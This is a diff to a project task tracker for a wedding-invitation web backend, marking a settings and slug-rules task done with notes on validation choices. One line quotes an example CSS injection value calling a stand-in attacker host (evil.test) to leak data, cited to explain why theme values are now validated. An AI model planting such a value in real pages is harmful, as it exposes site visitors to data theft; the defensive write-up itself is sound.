@@ -29,7 +29,7 @@
 | P1-11 | Couple sub-resource | backend | M | P1-10 | ✅
 | P1-12 | Events sub-resource | backend | M | P1-10 | ✅
 | P1-13 | Bank accounts and quote sub-resources | backend | M | P1-10 | ✅
-| P1-14 | Settings sub-resource and slug rules | backend | M | P1-10 |
+| P1-14 | Settings sub-resource and slug rules | backend | M | P1-10 | ✅
 | P1-15 | Change template without data loss | backend | M | P1-10, P0-20 |
 | P1-16 | Free-text sanitization pipeline | backend | M | P0-13 | ✅
 | P1-17 | Media upload — synchronous validation stage | backend | L | P1-10, P0-16 |
@@ -495,7 +495,7 @@
 
 | | |
 |---|---|
-| **Status** | TODO |
+| **Status** | **DONE** 2026-09-12 — [record](../MEMORY/records/2026-09-12-P1-14-settings-and-slug-rules.md) |
 | **Depends on** | P1-10 |
 | **Spec refs** | `docs/API/04-INVITATION-API.md` § Settings, `docs/DATABASE/04-INVITATIONS.md`, `docs/PLAN/02` § BR-6, `docs/PLAN/07` § Theme Variables |
 | **Spec required** | Yes — data model |
@@ -512,11 +512,15 @@
 6. Handle a slug uniqueness race by catching the unique violation and returning 409, per `docs/BACKEND/06` § Slug Validation.
 
 **Definition of Done**
-- [ ] A `section_key` the template does not define is rejected.
-- [ ] A non-configurable section cannot be disabled.
-- [ ] A theme override outside `customizable_theme_keys` is rejected.
-- [ ] Post-publish slug change requires confirmation and is rate limited.
-- [ ] A concurrent slug claim yields 409, not a 500.
+- [x] A `section_key` the template does not define is rejected. Two tests, one asserting **nothing is stored** — stored-and-ignored is the failure that looks like success.
+- [x] A non-configurable section cannot be disabled. 422 `SECTION_NOT_CONFIGURABLE`, with the positive case beside it so it is not passing by refusing everything. A **missing** `configurable` counts as not configurable: `docs/PLAN/07` writes `true` explicitly, and the other default would make a hero switchable off.
+- [x] A theme override outside `customizable_theme_keys` is rejected. Keys are compared **exactly** — `colors` does not grant `colors.primary` and vice versa, because a prefix match would widen every template's boundary the first time somebody nested a value.
+- [x] Post-publish slug change requires confirmation and is rate limited. Gated on `published_at IS NULL`, **not** `status != 'published'`: unpublishing does not un-share the links people already hold. `slug-change` added to the policy table at 3/day per user, since BR-6.2 asks for a limit and names no number.
+- [x] A concurrent slug claim yields 409, not a 500. Postgres `23505` caught by **code**, not by message.
+
+**Beyond the card — `theme_override` *values* are validated, not only its keys.** A theme value becomes a **CSS custom property on the public page**, and unlike a template definition an override comes from an end user: `red; background: url(https://evil.test/?c=…)` would have been a CSS injection reaching every guest. `HEX_COLOR` and `CSS_TOKEN` are imported from `@wi/schema` rather than re-derived, so a user's override is held to exactly what a template definition is held to. Eight injection shapes rejected; removing the check fails **11** tests.
+
+**How it was found**: `check-sanitized-fields` refused `theme_override` as unregistered, and writing the exemption reason forced the question "so what *does* protect this field?" — the keys were checked and the values were `z.unknown()`. That is `P1-16`'s real value: not catching unsanitized prose, but making somebody state what protects each field, where a missing answer becomes visible.
 
 ---
 
